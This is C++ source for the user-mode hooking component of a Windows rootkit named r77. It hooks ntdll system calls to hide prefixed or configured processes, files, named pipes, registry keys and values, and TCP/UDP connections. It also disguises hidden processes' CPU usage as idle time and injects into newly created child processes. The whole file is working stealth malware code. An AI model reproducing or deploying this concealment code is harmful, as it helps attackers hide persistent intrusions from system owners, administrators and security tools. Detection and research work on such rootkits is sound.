#include "r77.h"

bool Hooks::IsInitialized = false;

nt::NTQUERYSYSTEMINFORMATION Hooks::OriginalNtQuerySystemInformation = NULL;
nt::NTRESUMETHREAD Hooks::OriginalNtResumeThread = NULL;
nt::NTQUERYDIRECTORYFILE Hooks::OriginalNtQueryDirectoryFile = NULL;
nt::NTQUERYDIRECTORYFILEEX Hooks::OriginalNtQueryDirectoryFileEx = NULL;
nt::NTENUMERATEKEY Hooks::OriginalNtEnumerateKey = NULL;
nt::NTENUMERATEVALUEKEY Hooks::OriginalNtEnumerateValueKey = NULL;
nt::NTDEVICEIOCONTROLFILE Hooks::OriginalNtDeviceIoControlFile = NULL;

void Hooks::Initialize()
{
	if (!IsInitialized)
	{
		IsInitialized = true;

		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
		InstallHook("ntdll.dll", "NtResumeThread", (LPVOID*)&OriginalNtResumeThread, HookedNtResumeThread);
		InstallHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID*)&OriginalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
		InstallHook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID*)&OriginalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
		InstallHook("ntdll.dll", "NtEnumerateKey", (LPVOID*)&OriginalNtEnumerateKey, HookedNtEnumerateKey);
		InstallHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID*)&OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
		InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
		DetourTransactionCommit();
	}
}
void Hooks::Shutdown()
{
	if (IsInitialized)
	{
		IsInitialized = false;

		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		UninstallHook(OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);
		UninstallHook(OriginalNtResumeThread, HookedNtResumeThread);
		UninstallHook(OriginalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
		UninstallHook(OriginalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
		UninstallHook(OriginalNtEnumerateKey, HookedNtEnumerateKey);
		UninstallHook(OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
		UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
		DetourTransactionCommit();
	}
}

void Hooks::InstallHook(LPCSTR dll, LPCSTR function, LPVOID *originalFunction, LPVOID hookedFunction)
{
	*originalFunction = GetFunction(dll, function);
	if (*originalFunction) DetourAttach(originalFunction, hookedFunction);
}
void Hooks::UninstallHook(LPVOID originalFunction, LPVOID hookedFunction)
{
	if (originalFunction && hookedFunction) DetourDetach(&originalFunction, hookedFunction);
}

NTSTATUS NTAPI Hooks::HookedNtQuerySystemInformation(nt::SYSTEM_INFORMATION_CLASS systemInformationClass, LPVOID systemInformation, ULONG systemInformationLength, PULONG returnLength)
{
	// returnLength is important, but it may be NULL, so wrap this value.
	ULONG newReturnLength;
	NTSTATUS status = OriginalNtQuerySystemInformation(systemInformationClass, systemInformation, systemInformationLength, &newReturnLength);
	if (returnLength) *returnLength = newReturnLength;

	if (NT_SUCCESS(status))
	{
		// Hide processes
		if (systemInformationClass == nt::SYSTEM_INFORMATION_CLASS::SystemProcessInformation)
		{
			// Accumulate CPU usage of hidden processes.
			LARGE_INTEGER hiddenKernelTime = { 0 };
			LARGE_INTEGER hiddenUserTime = { 0 };
			LONGLONG hiddenCycleTime = 0;

			for (nt::PSYSTEM_PROCESS_INFORMATION current = (nt::PSYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
			{
				if (Rootkit::HasPrefix(current->ImageName) || Config::IsProcessIdHidden((DWORD)(DWORD_PTR)current->ProcessId) || Config::IsProcessNameHidden(current->ImageName))
				{
					hiddenKernelTime.QuadPart += current->KernelTime.QuadPart;
					hiddenUserTime.QuadPart += current->UserTime.QuadPart;
					hiddenCycleTime += current->CycleTime;

					if (previous)
					{
						if (current->NextEntryOffset) previous->NextEntryOffset += current->NextEntryOffset;
						else previous->NextEntryOffset = 0;
					}
					else
					{
						if (current->NextEntryOffset) systemInformation = (LPBYTE)systemInformation + current->NextEntryOffset;
						else systemInformation = NULL;
					}
				}
				else
				{
					previous = current;
				}

				if (current->NextEntryOffset) current = (nt::PSYSTEM_PROCESS_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
				else current = NULL;
			}

			// Add CPU usage of hidden processes to the System Idle Process.
			for (nt::PSYSTEM_PROCESS_INFORMATION current = (nt::PSYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
			{
				if (current->ProcessId == 0)
				{
					current->KernelTime.QuadPart += hiddenKernelTime.QuadPart;
					current->UserTime.QuadPart += hiddenUserTime.QuadPart;
					current->CycleTime += hiddenCycleTime;
					break;
				}

				previous = current;

				if (current->NextEntryOffset) current = (nt::PSYSTEM_PROCESS_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
				else current = NULL;
			}
		}
		// Hide CPU usage
		else if (systemInformationClass == nt::SYSTEM_INFORMATION_CLASS::SystemProcessorPerformanceInformation)
		{
			// ProcessHacker graph per CPU
			LARGE_INTEGER hiddenKernelTime = { 0 };
			LARGE_INTEGER hiddenUserTime = { 0 };
			if (GetProcessHiddenTimes(&hiddenKernelTime, &hiddenUserTime, NULL))
			{
				ULONG numberOfProcessors = newReturnLength / sizeof(nt::SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION);
				for (ULONG i = 0; i < numberOfProcessors; i++)
				{
					//TODO: This works, but it needs to be on a per-cpu basis instead of x / numberOfProcessors
					nt::PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION performanceInformation = &((nt::PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION)systemInformation)[i];
					performanceInformation->KernelTime.QuadPart += hiddenUserTime.QuadPart / numberOfProcessors;
					performanceInformation->UserTime.QuadPart -= hiddenUserTime.QuadPart / numberOfProcessors;
					performanceInformation->IdleTime.QuadPart += (hiddenKernelTime.QuadPart + hiddenUserTime.QuadPart) / numberOfProcessors;
				}
			}
		}
		// Hide CPU usage
		else if (systemInformationClass == nt::SYSTEM_INFORMATION_CLASS::SystemProcessorIdleCycleTimeInformation)
		{
			// ProcessHacker graph for all CPU's
			LONGLONG hiddenCycleTime = 0;
			if (GetProcessHiddenTimes(NULL, NULL, &hiddenCycleTime))
			{
				ULONG numberOfProcessors = newReturnLength / sizeof(LARGE_INTEGER);
				for (ULONG i = 0; i < numberOfProcessors; i++)
				{
					((PLARGE_INTEGER)systemInformation)[i].QuadPart += hiddenCycleTime / numberOfProcessors;
				}
			}
		}
	}

	return status;
}
NTSTATUS NTAPI Hooks::HookedNtResumeThread(HANDLE thread, PULONG suspendCount)
{
	// Child process hooking:
	// When a process is created, its parent process calls NtResumeThread to start the new process after process creation is completed.
	// At this point, the process is suspended and should be injected. After injection is completed, NtResumeThread should be called.
	// To inject the process, a connection to the r77 service is performed through a named pipe.
	// Because a 32-bit process can create a 64-bit child process, or vice versa, injection cannot be performed here.

	DWORD processId = GetProcessIdOfThread(thread);
	if (processId != GetCurrentProcessId()) // If NtResumeThread is called on this process, it is not a child process
	{
		// This function returns, *after* injection is completed.
		HookChildProcess(processId);
	}

	return OriginalNtResumeThread(thread, suspendCount);
}
NTSTATUS NTAPI Hooks::HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, LPVOID fileInformation, ULONG length, nt::FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan)
{
	NTSTATUS status = OriginalNtQueryDirectoryFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);

	// Hide files, directories and named pipes
	if (NT_SUCCESS(status) && (fileInformationClass == nt::FILE_INFORMATION_CLASS::FileDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileFullDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileIdFullDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileBothDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileNamesInformation))
	{
		LPVOID current = fileInformation;
		LPVOID previous = NULL;
		ULONG nextEntryOffset;

		do
		{
			nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);

			if (Rootkit::HasPrefix(FileInformationGetName(current, fileInformationClass)))
			{
				if (nextEntryOffset)
				{
					RtlCopyMemory
					(
						current,
						(LPBYTE)current + nextEntryOffset,
						(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
					);
					continue;
				}
				else
				{
					if (current == fileInformation) status = STATUS_NO_MORE_FILES;
					else FileInformationSetNextEntryOffset(previous, fileInformationClass, 0);
					break;
				}
			}

			previous = current;
			current = (LPBYTE)current + nextEntryOffset;
		}
		while (nextEntryOffset);
	}

	return status;
}
NTSTATUS NTAPI Hooks::HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, LPVOID fileInformation, ULONG length, nt::FILE_INFORMATION_CLASS fileInformationClass, ULONG queryFlags, PUNICODE_STRING fileName)
{
	NTSTATUS status = OriginalNtQueryDirectoryFileEx(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, queryFlags, fileName);

	// Hide files, directories and named pipes
	// Some applications (e.g. cmd.exe) use NtQueryDirectoryFileEx instead of NtQueryDirectoryFile.
	if (NT_SUCCESS(status) && (fileInformationClass == nt::FILE_INFORMATION_CLASS::FileDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileFullDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileIdFullDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileBothDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation || fileInformationClass == nt::FILE_INFORMATION_CLASS::FileNamesInformation))
	{
		if (queryFlags & SL_RETURN_SINGLE_ENTRY)
		{
			// When returning a single entry, skip until the first item is found that is not hidden.
			for (bool skip = Rootkit::HasPrefix(FileInformationGetName(fileInformation, fileInformationClass)); skip; skip = Rootkit::HasPrefix(FileInformationGetName(fileInformation, fileInformationClass)))
			{
				status = OriginalNtQueryDirectoryFileEx(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, queryFlags, fileName);
				if (status) break;
			}
		}
		else
		{
			LPVOID current = fileInformation;
			LPVOID previous = NULL;
			ULONG nextEntryOffset;

			do
			{
				nextEntryOffset = FileInformationGetNextEntryOffset(current, fileInformationClass);

				if (Rootkit::HasPrefix(FileInformationGetName(current, fileInformationClass)))
				{
					if (nextEntryOffset)
					{
						RtlCopyMemory
						(
							current,
							(LPBYTE)current + nextEntryOffset,
							(ULONG)(length - ((ULONGLONG)current - (ULONGLONG)fileInformation) - nextEntryOffset)
						);
						continue;
					}
					else
					{
						if (current == fileInformation) status = STATUS_NO_MORE_FILES;
						else FileInformationSetNextEntryOffset(previous, fileInformationClass, 0);
						break;
					}
				}

				previous = current;
				current = (LPBYTE)current + nextEntryOffset;
			}
			while (nextEntryOffset);
		}
	}

	return status;
}
NTSTATUS NTAPI Hooks::HookedNtEnumerateKey(HANDLE key, ULONG index, nt::KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength)
{
	NTSTATUS status = OriginalNtEnumerateKey(key, index, keyInformationClass, keyInformation, keyInformationLength, resultLength);

	// Implement hiding of registry keys by correcting the index in NtEnumerateKey.
	if (status == ERROR_SUCCESS && (keyInformationClass == nt::KEY_INFORMATION_CLASS::KeyBasicInformation || keyInformationClass == nt::KEY_INFORMATION_CLASS::KeyNameInformation))
	{
		for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
		{
			status = OriginalNtEnumerateKey(key, i, keyInformationClass, keyInformation, keyInformationLength, resultLength);

			if (!Rootkit::HasPrefix(KeyInformationGetName(keyInformation, keyInformationClass)))
			{
				newIndex++;
			}
		}
	}

	return status;
}
NTSTATUS NTAPI Hooks::HookedNtEnumerateValueKey(HANDLE key, ULONG index, nt::KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
{
	NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

	// Implement hiding of registry values by correcting the index in NtEnumerateValueKey.
	if (status == ERROR_SUCCESS && (keyValueInformationClass == nt::KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation || keyValueInformationClass == nt::KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation))
	{
		for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
		{
			status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

			if (!Rootkit::HasPrefix(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass)))
			{
				newIndex++;
			}
		}
	}

	return status;
}
NTSTATUS NTAPI Hooks::HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, ULONG ioControlCode, LPVOID inputBuffer, ULONG inputBufferLength, LPVOID outputBuffer, ULONG outputBufferLength)
{
	NTSTATUS status = OriginalNtDeviceIoControlFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, ioControlCode, inputBuffer, inputBufferLength, outputBuffer, outputBufferLength);

	if (NT_SUCCESS(status))
	{
		// Hide TCP and UDP entries
		if (ioControlCode == IOCTL_NSI_GETALLPARAM && outputBuffer && outputBufferLength == sizeof(nt::NSI_PARAM))
		{
			// Check, if the device is "\Device\Nsi"
			BYTE deviceName[100];
			if (NT_SUCCESS(nt::NtQueryObject(fileHandle, nt::OBJECT_INFORMATION_CLASS::ObjectNameInformation, deviceName, 100, NULL)) &&
				!_wcsnicmp(DEVICE_NSI, ((PUNICODE_STRING)deviceName)->Buffer, sizeof(DEVICE_NSI) / sizeof(WCHAR)))
			{
				nt::PNSI_PARAM nsiParam = (nt::PNSI_PARAM)outputBuffer;
				if (nsiParam->Entries && (nsiParam->Type == nt::NSI_PARAM_TYPE::Tcp || nsiParam->Type == nt::NSI_PARAM_TYPE::Udp))
				{
					// The status and process table may be NULL and must be checked.
					nt::PNSI_TCP_ENTRY tcpEntries = (nt::PNSI_TCP_ENTRY)nsiParam->Entries;
					nt::PNSI_UDP_ENTRY udpEntries = (nt::PNSI_UDP_ENTRY)nsiParam->Entries;
					nt::PNSI_STATUS_ENTRY statusEntries = (nt::PNSI_STATUS_ENTRY)nsiParam->StatusEntries;
					nt::PNSI_PROCESS_ENTRY processEntries = (nt::PNSI_PROCESS_ENTRY)nsiParam->ProcessEntries;

					WCHAR processName[MAX_PATH + 1];

					for (DWORD i = 0; i < nsiParam->Count; i++)
					{
						processName[0] = L'\0';

						BOOL hidden = FALSE;
						if (nsiParam->Type == nt::NSI_PARAM_TYPE::Tcp)
						{
							if (processEntries) GetProcessFileName(processEntries[i].TcpProcessId, FALSE, processName, MAX_PATH);

							hidden =
								Config::IsTcpLocalPortHidden(_byteswap_ushort(tcpEntries[i].Local.Port)) ||
								Config::IsTcpRemotePortHidden(_byteswap_ushort(tcpEntries[i].Remote.Port)) ||
								processEntries && Config::IsProcessIdHidden(processEntries[i].TcpProcessId) ||
								Config::IsProcessNameHidden(processName) ||
								Rootkit::HasPrefix(processName);
						}
						else if (nsiParam->Type == nt::NSI_PARAM_TYPE::Udp)
						{
							if (processEntries) GetProcessFileName(processEntries[i].UdpProcessId, FALSE, processName, MAX_PATH);

							hidden =
								Config::IsUdpPortHidden(_byteswap_ushort(udpEntries[i].Port)) ||
								processEntries && Config::IsProcessIdHidden(processEntries[i].UdpProcessId) ||
								Config::IsProcessNameHidden(processName) ||
								Rootkit::HasPrefix(processName);
						}

						// If hidden, move all following entries up by one and decrease count.
						if (hidden)
						{
							if (i < nsiParam->Count - 1)
							{
								if (nsiParam->Type == nt::NSI_PARAM_TYPE::Tcp)
								{
									RtlMoveMemory(&tcpEntries[i], &tcpEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
								}
								else if (nsiParam->Type == nt::NSI_PARAM_TYPE::Udp)
								{
									RtlMoveMemory(&udpEntries[i], &udpEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
								}

								if (statusEntries) RtlMoveMemory(&statusEntries[i], &statusEntries[i + 1], (nsiParam->Count - i - 1) * sizeof(nt::NSI_STATUS_ENTRY));
								if (processEntries) RtlMoveMemory(&processEntries[i], &processEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);
							}

							nsiParam->Count--;
							i--;
						}
					}
				}
			}
		}
	}

	return status;
}

bool Hooks::GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime)
{
	// Count hidden CPU usage explicitly instead of waiting for a call to NtQuerySystemInformation(SystemProcessInformation).
	// Task managers call NtQuerySystemInformation(SystemProcessInformation) also, but not necessarily in a matching frequency.

	bool result = false;
	LPBYTE systemInformation = new BYTE[1024 * 1024 * 2];
	ULONG returnLength;

	if (NT_SUCCESS(OriginalNtQuerySystemInformation(nt::SYSTEM_INFORMATION_CLASS::SystemProcessInformation, systemInformation, 1024 * 1024 * 2, &returnLength)))
	{
		if (hiddenKernelTime) hiddenKernelTime->QuadPart = 0;
		if (hiddenUserTime) hiddenUserTime->QuadPart = 0;
		if (hiddenCycleTime) *hiddenCycleTime = 0;

		for (nt::PSYSTEM_PROCESS_INFORMATION current = (nt::PSYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
		{
			if (Rootkit::HasPrefix(current->ImageName) || Config::IsProcessIdHidden((DWORD)(DWORD_PTR)current->ProcessId) || Config::IsProcessNameHidden(current->ImageName))
			{
				if (hiddenKernelTime) hiddenKernelTime->QuadPart += current->KernelTime.QuadPart;
				if (hiddenUserTime) hiddenUserTime->QuadPart += current->UserTime.QuadPart;
				if (hiddenCycleTime) *hiddenCycleTime += current->CycleTime;
			}

			previous = current;

			if (current->NextEntryOffset) current = (nt::PSYSTEM_PROCESS_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
			else current = NULL;
		}

		result = true;
	}

	delete[] systemInformation;
	return result;
}
PWCHAR Hooks::FileInformationGetName(LPVOID fileInformation, nt::FILE_INFORMATION_CLASS fileInformationClass)
{
	switch (fileInformationClass)
	{
		case nt::FILE_INFORMATION_CLASS::FileDirectoryInformation:
			return ((nt::PFILE_DIRECTORY_INFORMATION)fileInformation)->FileName;
		case nt::FILE_INFORMATION_CLASS::FileFullDirectoryInformation:
			return ((nt::PFILE_FULL_DIR_INFORMATION)fileInformation)->FileName;
		case nt::FILE_INFORMATION_CLASS::FileIdFullDirectoryInformation:
			return ((nt::PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileName;
		case nt::FILE_INFORMATION_CLASS::FileBothDirectoryInformation:
			return ((nt::PFILE_BOTH_DIR_INFORMATION)fileInformation)->FileName;
		case nt::FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation:
			return ((nt::PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileName;
		case nt::FILE_INFORMATION_CLASS::FileNamesInformation:
			return ((nt::PFILE_NAMES_INFORMATION)fileInformation)->FileName;
		default:
			return NULL;
	}
}
ULONG Hooks::FileInformationGetNextEntryOffset(LPVOID fileInformation, nt::FILE_INFORMATION_CLASS fileInformationClass)
{
	switch (fileInformationClass)
	{
		case nt::FILE_INFORMATION_CLASS::FileDirectoryInformation:
			return ((nt::PFILE_DIRECTORY_INFORMATION)fileInformation)->NextEntryOffset;
		case nt::FILE_INFORMATION_CLASS::FileFullDirectoryInformation:
			return ((nt::PFILE_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset;
		case nt::FILE_INFORMATION_CLASS::FileIdFullDirectoryInformation:
			return ((nt::PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset;
		case nt::FILE_INFORMATION_CLASS::FileBothDirectoryInformation:
			return ((nt::PFILE_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset;
		case nt::FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation:
			return ((nt::PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset;
		case nt::FILE_INFORMATION_CLASS::FileNamesInformation:
			return ((nt::PFILE_NAMES_INFORMATION)fileInformation)->NextEntryOffset;
		default:
			return 0;
	}
}
void Hooks::FileInformationSetNextEntryOffset(LPVOID fileInformation, nt::FILE_INFORMATION_CLASS fileInformationClass, ULONG value)
{
	switch (fileInformationClass)
	{
		case nt::FILE_INFORMATION_CLASS::FileDirectoryInformation:
			((nt::PFILE_DIRECTORY_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case nt::FILE_INFORMATION_CLASS::FileFullDirectoryInformation:
			((nt::PFILE_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case nt::FILE_INFORMATION_CLASS::FileIdFullDirectoryInformation:
			((nt::PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case nt::FILE_INFORMATION_CLASS::FileBothDirectoryInformation:
			((nt::PFILE_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case nt::FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation:
			((nt::PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case nt::FILE_INFORMATION_CLASS::FileNamesInformation:
			((nt::PFILE_NAMES_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
	}
}
PWCHAR Hooks::KeyInformationGetName(LPVOID keyInformation, nt::KEY_INFORMATION_CLASS keyInformationClass)
{
	switch (keyInformationClass)
	{
		case nt::KEY_INFORMATION_CLASS::KeyBasicInformation:
			return ((nt::PKEY_BASIC_INFORMATION)keyInformation)->Name;
		case nt::KEY_INFORMATION_CLASS::KeyNameInformation:
			return ((nt::PKEY_NAME_INFORMATION)keyInformation)->Name;
		default:
			return NULL;
	}
}
PWCHAR Hooks::KeyValueInformationGetName(LPVOID keyValueInformation, nt::KEY_VALUE_INFORMATION_CLASS keyValueInformationClass)
{
	switch (keyValueInformationClass)
	{
		case nt::KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation:
			return ((nt::PKEY_VALUE_BASIC_INFORMATION)keyValueInformation)->Name;
		case nt::KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation:
			return ((nt::PKEY_VALUE_FULL_INFORMATION)keyValueInformation)->Name;
		default:
			return NULL;
	}
}